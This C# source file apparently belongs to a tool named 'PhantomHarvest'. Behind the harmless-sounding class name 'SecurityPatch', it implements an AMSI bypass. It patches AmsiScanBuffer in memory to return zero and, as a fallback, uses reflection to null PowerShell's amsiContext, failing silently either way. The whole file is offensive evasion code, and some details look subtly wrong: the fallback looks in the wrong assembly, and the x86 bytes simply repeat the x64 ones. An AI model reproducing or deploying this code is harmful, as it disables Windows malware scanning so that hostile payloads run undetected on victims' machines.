using System;
using System.Runtime.InteropServices;

namespace PhantomHarvest.Helper
{
    /// <summary>
    /// AMSI Bypass 模块
    /// 实现多种方法绕过 Windows AMSI（反恶意软件扫描接口）
    /// </summary>
    public static class SecurityPatch
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        /// <summary>
        /// 执行 AMSI Bypass
        /// 尝试多种方法，只要有一种成功即可
        /// </summary>
        /// <returns>是否成功</returns>
        public static bool Patch()
        {
            try
            {
                // 方法1：直接内存 Patch AmsiScanBuffer
                if (PatchAmsiScanBuffer())
                    return true;

                // 方法2：反射调用 Patch（备选）
                return PatchViaReflection();
            }
            catch
            {
                // 失败也不抛异常，静默降级
                return false;
            }
        }

        /// <summary>
        /// 方法1：直接 Patch AmsiScanBuffer 函数
        /// </summary>
        private static bool PatchAmsiScanBuffer()
        {
            try
            {
                // 加载 amsi.dll
                IntPtr hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi == IntPtr.Zero) return false;

                // 获取 AmsiScanBuffer 函数地址
                IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (pAmsiScanBuffer == IntPtr.Zero) return false;

                // 修改内存权限为 RWX (0x40)
                uint oldProtect;
                if (!VirtualProtect(pAmsiScanBuffer, (UIntPtr)6, 0x40, out oldProtect))
                    return false;

                // 写入 Patch 字节码
                byte[] patch;
                if (IntPtr.Size == 8)
                {
                    // x64: mov rax, 0; ret  (B8 00 00 00 00 C3)
                    patch = new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
                }
                else
                {
                    // x86: mov eax, 0; ret  (B8 00 00 00 00 C3)
                    patch = new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
                }

                Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

                // 恢复原有权限
                VirtualProtect(pAmsiScanBuffer, (UIntPtr)6, oldProtect, out oldProtect);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 方法2：通过反射修改 AMSI Context
        /// 适用于 PowerShell 环境
        /// </summary>
        private static bool PatchViaReflection()
        {
            try
            {
                var amsiAssembly = typeof(object).Assembly;
                var amsiUtilsType = amsiAssembly.GetType("System.Management.Automation.AmsiUtils");
                if (amsiUtilsType == null) return false;

                var amsiContextField = amsiUtilsType.GetField("amsiContext", 
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                if (amsiContextField == null) return false;

                // 将 amsiContext 设置为 IntPtr.Zero，禁用 AMSI
                amsiContextField.SetValue(null, IntPtr.Zero);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
